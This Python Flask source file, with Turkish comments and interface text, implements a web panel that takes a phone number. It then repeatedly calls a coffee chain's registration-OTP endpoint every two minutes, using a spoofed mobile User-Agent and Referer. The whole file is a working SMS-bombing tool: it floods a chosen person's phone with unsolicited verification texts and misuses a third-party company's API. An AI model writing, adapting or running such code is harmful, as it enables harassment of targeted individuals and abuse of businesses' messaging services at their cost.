import os, requests, time, threading
from flask import Flask, render_template_string, request, redirect, url_for

app = Flask(__name__)

# --- AYARLAR VE HAFIZA ---
state = {
    "phone": "",
    "logs": [],
    "is_running": False
}

def write_log(msg):
    tm = time.strftime('%H:%M:%S')
    state["logs"].insert(0, f"[{tm}] {msg}")
    if len(state["logs"]) > 15: state["logs"].pop()
    print(f">>> {tm} - {msg}", flush=True)

# --- ARKA PLAN SMS DÖNGÜSÜ ---
def sms_worker():
    while True:
        if state["is_running"] and state["phone"]:
            url = "https://www.kahvedunyasi.com/api/v1/auth/register-otp"
            payload = {"mobile_number": state["phone"], "country_code": "90"}
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
                "Referer": "https://www.kahvedunyasi.com/kayit",
                "X-Requested-With": "XMLHttpRequest"
            }
            try:
                res = requests.post(url, json=payload, headers=headers, timeout=10)
                if res.status_code in [200, 201]:
                    write_log(f"Başarılı ✅ ({state['phone']})")
                else:
                    write_log(f"Hata ❌ (Kod: {res.status_code})")
            except:
                write_log("Bağlantı Hatası ⚠️")
        
        time.sleep(120) # 2 dakikada bir vursun

# Arka plan işlemini başlat
threading.Thread(target=sms_worker, daemon=True).start()

# --- WEB ARAYÜZÜ ---
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        action = request.form.get('action')
        if action == "start":
            phone = request.form.get('phone', '').strip()
            if len(phone) == 10:
                state["phone"] = phone
                state["is_running"] = True
                write_log(f"Sistem Başlatıldı: {phone}")
        elif action == "stop":
            state["is_running"] = False
            write_log("Sistem Durduruldu.")
        return redirect(url_for('index'))

    html = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SMS Panel v4</title>
        <style>
            body { font-family: sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; padding-top: 50px; margin: 0; }
            .card { background: #1e293b; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); width: 360px; text-align: center; border: 1px solid #334155; }
            h2 { color: #38bdf8; margin-bottom: 20px; }
            input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #475569; background: #0f172a; color: #4ade80; border-radius: 8px; box-sizing: border-box; font-size: 16px; text-align: center; outline: none; }
            .btn-group { display: flex; gap: 10px; }
            button { flex: 1; padding: 12px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
            .start { background: #10b981; color: white; }
            .stop { background: #ef4444; color: white; }
            .log-box { text-align: left; background: #000; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 12px; height: 180px; overflow-y: auto; margin-top: 20px; border: 1px solid #334155; }
            .status { margin-bottom: 15px; font-size: 14px; font-weight: bold; color: {{ 'lime' if running else 'red' }}; }
        </style>
        <script>setTimeout(() => { if (!document.querySelector('input:focus')) location.reload(); }, 20000);</script>
    </head>
    <body>
        <div class="card">
            <h2>SMS MOTORU</h2>
            <div class="status">● Durum: {{ 'ÇALIŞIYOR' if running else 'DURDU' }}</div>
            <form method="POST">
                <input type="text" name="phone" placeholder="5XXXXXXXXX" value="{{ phone }}" maxlength="10">
                <div class="btn-group">
                    <button type="submit" name="action" value="start" class="start">BAŞLAT</button>
                    <button type="submit" name="action" value="stop" class="stop">DURDUR</button>
                </div>
            </form>
            <div class="log-box">
                {% for log in logs %}<div>> {{ log }}</div>{% endfor %}
            </div>
            <p style="font-size:10px; color:#64748b; margin-top:15px;">Aralık: 2 Dakika | Render Log Aktif</p>
        </div>
    </body>
    </html>
    """
    return render_template_string(html, phone=state["phone"], logs=state["logs"], running=state["is_running"])

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 50000)))
